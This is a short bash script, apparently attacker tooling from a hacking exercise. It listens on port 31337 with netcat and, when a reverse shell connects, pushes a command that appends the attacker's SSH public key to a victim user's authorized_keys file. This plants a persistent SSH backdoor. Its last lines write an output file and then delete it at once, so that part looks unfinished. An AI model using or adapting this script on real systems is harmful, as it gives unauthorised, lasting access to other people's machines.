#!/bin/bash

sshkey=$( cat ~/.ssh/id_rsa.pub )

# Fix location
echo "echo \"${sshkey} \" >> /home/robbe/.ssh/authorized_keys; whoami; exit;" | sudo nc -lvp 31337 > out

tr -d '\n' < out > ssh_name
rm out ssh_name
